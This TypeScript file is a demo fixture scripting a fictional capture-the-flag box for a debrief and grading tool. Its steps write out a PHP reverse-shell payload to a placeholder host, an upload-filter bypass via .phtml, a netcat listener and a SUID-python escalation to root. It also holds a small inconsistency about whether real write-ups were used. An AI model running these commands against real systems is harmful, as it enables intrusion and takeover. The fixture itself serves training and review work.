/**
 * A scripted end-to-end playthrough of a second FICTIONAL practice box ("Dunmoor", Easy, on the
 * invented "Breachyard" platform), used to demo the debrief live the same way saltmarsh.ts does. No
 * real box, no capture agent, browser-only. All hosts, names, flags and credentials are invented;
 * nothing here is copied from any real platform's room, artwork or write-up. The command path is a
 * generic web-to-root Linux chain (service recon, content discovery, an upload-filter bypass to a
 * www-data shell, then a SUID-interpreter GTFOBins jump to root) with reconstructed outputs.
 */
import type { GoldenObjective, Session } from "../../types/report";
import { buildRaw, makeDemo, type Step } from "./build";

const START = Date.parse("2026-07-08T14:00:00Z");

const STEPS: Step[] = [
  // --- Recon: services, web content discovery ---
  { cmd: "nmap -sV -sC -v dunmoor.range", gap: 2_000, dur: 25_000, lines: 12, volume: 1_000, out: "22/tcp OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 · 80/tcp Apache httpd 2.4.29 (Ubuntu) · Ubuntu 18.04 web server" },
  { cmd: "gobuster dir -u http://dunmoor.range/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", gap: 20_000, dur: 90_000, lines: 14, volume: 3_000, out: "/css (Status: 301) · /js (Status: 301) · /panel (Status: 301) · /uploads (Status: 301) · /index.php (Status: 200)" },
  { cmd: "curl -s http://dunmoor.range/panel/", gap: 15_000, dur: 900, lines: 6, out: '<form action="upload.php" method="post" enctype="multipart/form-data"> · an image upload panel; page text warns "PHP files are not allowed!"' },

  // --- Exploitation: extension-filter bypass, PHP reverse shell as www-data ---
  { cmd: 'echo \'<?php system("bash -c \\\'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1\\\'"); ?>\' > shell.phtml', gap: 60_000, dur: 400, lines: 1, out: "payload written as shell.phtml · the filter only checks for .php/.php3/.php4/.php5, and Apache's mod_php config still hands .phtml to the PHP interpreter; system() calls back to x.x.x.x:1234" },
  { cmd: "nc -lvnp 1234", gap: 8_000, dur: 600, lines: 1, out: "listening on [any] 1234 ..." },
  { cmd: 'curl -F "file=@shell.phtml" http://dunmoor.range/panel/upload.php', gap: 10_000, dur: 2_200, lines: 2, out: "200 OK · Successfully uploaded! stored as /uploads/shell.phtml" },
  { cmd: "curl http://dunmoor.range/uploads/shell.phtml", gap: 8_000, dur: 1_500, lines: 1, out: "request hangs · system() spawned the bash -i reverse shell against x.x.x.x:1234; www-data@dunmoor:/var/www/html$ (caught on the listener)" },
  { cmd: "id", gap: 4_000, dur: 300, lines: 1, out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)" },
  { cmd: "python -c \"import pty; pty.spawn('/bin/bash')\"", gap: 5_000, dur: 800, lines: 1, out: "www-data@dunmoor:/var/www/html$ · upgraded the dumb pipe to a real pty" },

  // --- Orient, capture user flag ---
  { cmd: "find / -type f -iname user.txt 2>/dev/null", gap: 30_000, dur: 6_000, lines: 1, out: "/var/www/user.txt" },
  { cmd: "cat /var/www/user.txt", gap: 3_000, dur: 300, lines: 1, out: "[flag]" },

  // --- Privesc: SUID python, GTFOBins ---
  { cmd: "find / -user root -perm /4000 2>/dev/null", gap: 60_000, dur: 5_000, lines: 9, out: "/usr/bin/python · the one non-standard entry alongside the usual passwd/su/sudo/mount SUID set" },
  { cmd: 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', gap: 15_000, dur: 500, lines: 1, out: "# · /usr/bin/python is SUID root; GTFOBins' execl swap spawns /bin/sh -p, preserving the euid" },
  { cmd: "whoami", gap: 2_000, dur: 200, lines: 1, out: "root" },
  { cmd: "cat /root/root.txt", gap: 5_000, dur: 300, lines: 1, out: "[flag]" },
];

const DEMO_END = buildRaw(STEPS, START).at(-1)!.ended_at_ms;

export const DUNMOOR_SESSION: Session = {
  uuid: "demo-dunmoor-0001-0001-000000000001",
  started_at: new Date(START).toISOString(),
  ended_at: new Date(DEMO_END).toISOString(),
  target_scope: "Breachyard :: Dunmoor",
  context_path: "host",
  shell: "bash",
  source: "local_pty",
  machine: { name: "Dunmoor", os: "Linux", difficulty: "Easy" },
  // Explicit target: a fictional Breachyard box with an inline (data-URI) emblem - no external asset fetch.
  target: {
    platform: "breachyard",
    kind: "room",
    name: "Dunmoor",
    slug: "dunmoor",
    os: "Linux",
    difficulty: { level: 1, label: "Easy" },
    emblem: {
      avatar: "data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2064%2064%22%3E%3Cpath%20d%3D%22M32%203%2057%2017.5v29L32%2061%207%2046.5v-29Z%22%20fill%3D%22%2317122a%22%20stroke%3D%22%23c7a0ff%22%20stroke-width%3D%222.6%22%2F%3E%3Cpath%20d%3D%22M7%2047q9-16%2018-14t12%209%2019-6v11L32%2058%207%2046Z%22%20fill%3D%22%238a6bd1%22%20opacity%3D%220.8%22%2F%3E%3Cpath%20d%3D%22M7%2047q11-11%2020-7t14%206%2016-8%22%20fill%3D%22none%22%20stroke%3D%22%23efe6ff%22%20stroke-width%3D%221.6%22%2F%3E%3Ccircle%20cx%3D%2246%22%20cy%3D%2221%22%20r%3D%224.8%22%20fill%3D%22%23f2b24a%22%2F%3E%3Cpath%20d%3D%22M30%2046l3-13%203%2013%22%20fill%3D%22%23efe6ff%22%2F%3E%3C%2Fsvg%3E",
      hue: null,
    },
    url: null,
  },
};

/**
 * The intended path from the (real) write-ups. `fingerprint_webserver` (a `whatweb`/`curl -I`
 * tech-stack check before content discovery) is never run in this transcript, so it stays skipped —
 * both source write-ups go straight from the nmap service scan into gobuster.
 */
export const DUNMOOR_GOLDEN: GoldenObjective[] = [
  { objective: "enumerate_services", tactic: "TA0007", satisfied_by: ["nmap"] },
  { objective: "fingerprint_webserver", tactic: "TA0007", satisfied_by: ["whatweb", "curl -I"], depends_on: ["enumerate_services"] },
  { objective: "discover_web_directories", tactic: "TA0007", satisfied_by: ["gobuster"], depends_on: ["enumerate_services"] },
  { objective: "identify_upload_panel", tactic: "TA0007", satisfied_by: ["curl"], depends_on: ["discover_web_directories"] },
  { objective: "exploit_upload_bypass", tactic: "TA0002", satisfied_by: ["echo"], depends_on: ["identify_upload_panel"] },
  { objective: "get_foothold", tactic: "TA0002", satisfied_by: ["nc", "ncat"], depends_on: ["exploit_upload_bypass"] },
  { objective: "orient_as_www_data", tactic: "TA0004", satisfied_by: ["id", "whoami"], depends_on: ["get_foothold"] },
  { objective: "stabilize_shell", tactic: "TA0002", satisfied_by: ["python -c"], depends_on: ["orient_as_www_data"] },
  { objective: "locate_user_flag", tactic: "TA0004", satisfied_by: ["find"], depends_on: ["stabilize_shell"] },
  { objective: "capture_user_flag", tactic: "TA0004", satisfied_by: ["cat"], depends_on: ["locate_user_flag"] },
  { objective: "find_suid_binaries", tactic: "TA0004", satisfied_by: ["find"], depends_on: ["capture_user_flag"] },
  { objective: "exploit_suid_python", tactic: "TA0002", satisfied_by: ["python -c"], depends_on: ["find_suid_binaries"] },
  { objective: "escalate_to_root", tactic: "TA0004", satisfied_by: ["whoami"], depends_on: ["exploit_suid_python"] },
  { objective: "capture_root_flag", tactic: "TA0004", satisfied_by: ["cat"], depends_on: ["escalate_to_root"] },
];

/**
 * The fully-resolved demo, built through the shared registry pipeline (build.ts): raw commands,
 * graded report, and stable id all derive from the same STEPS/session/golden above. Pre-registered
 * in the store so a "Dunmoor" card always shows in History; opening it replays the run live (see
 * runLiveDemo).
 */
export const DUNMOOR = makeDemo({ platform: "breachyard", slug: "dunmoor", session: DUNMOOR_SESSION, steps: STEPS, golden: DUNMOOR_GOLDEN, startMs: START });
